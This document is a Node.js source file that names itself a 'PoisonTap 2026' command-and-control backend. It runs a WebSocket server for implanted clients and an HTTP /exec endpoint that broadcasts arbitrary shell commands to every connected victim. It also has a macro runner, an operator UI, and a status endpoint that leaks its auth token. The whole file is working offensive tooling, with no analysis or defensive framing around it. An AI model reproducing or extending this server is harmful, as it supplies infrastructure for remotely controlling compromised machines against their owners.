// PoisonTap 2026 | Enhanced C2 Backend with All-Seeing Eye UI
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');
const fsPromises = fs.promises;
const crypto = require('crypto');
const path = require('path');
const macros = require('./macros');

const PORT = 3000;
const WSS_PORT = 8443;
const clients = new Map();
const AUTH_TOKEN = crypto.randomBytes(16).toString('hex');

const wss = new WebSocket.Server({ port: WSS_PORT, verifyClient: (info, cb) => {
  const token = info.req.headers['x-auth'];
  cb(token === AUTH_TOKEN);
}});

wss.on('connection', (ws) => {
  const id = crypto.randomUUID();
  clients.set(id, { ws, conn: Date.now() });
  ws.isAlive = true;

  ws.on('pong', () => { ws.isAlive = true; });
  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data.toString());
      if(msg.type === 'heartbeat') return;
      console.log(`[C2] ${id}:`, msg);
    } catch(e){}
  });
  ws.on('close', () => clients.delete(id));
});

setInterval(() => {
  wss.clients.forEach(ws => {
    if(!ws.isAlive) return ws.terminate();
    ws.isAlive = true;
    ws.ping();
  });
}, 30000);

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);

  // Serve All-Seeing Eye 4K UI
  if (url.pathname === '/' || url.pathname === '/index.html') {
    try {
      const html = await fsPromises.readFile(path.join(__dirname, 'ui_4k_all_seeing_eye.html'), 'utf8');
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.end(html);
    } catch (e) {
      res.writeHead(500); res.end('UI not found. Generate it.');
    }
    return;
  }

  if(url.pathname === '/status'){
    res.writeHead(200, {'Content-Type':'application/json'});
    res.end(JSON.stringify({connected: clients.size, token: AUTH_TOKEN}));
  } else if(url.pathname === '/exec'){
    const cmd = decodeURIComponent(url.searchParams.get('cmd') || '');
    clients.forEach((c, id) => c.ws.send(JSON.stringify({type:'exec', id, payload:cmd})));
    res.writeHead(200, {'Content-Type':'text/plain'}); res.end('queued');
  } else if(url.pathname === '/macro'){
    const name = url.searchParams.get('name');
    const result = macros.execute(name);
    res.writeHead(200, {'Content-Type':'application/json'});
    res.end(JSON.stringify(result));
  } else {
    res.writeHead(404); res.end();
  }
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[+] Backend C2 active: http://0.0.0.0:${PORT} | WSS on ${WSS_PORT} (auth: ${AUTH_TOKEN})`);
});
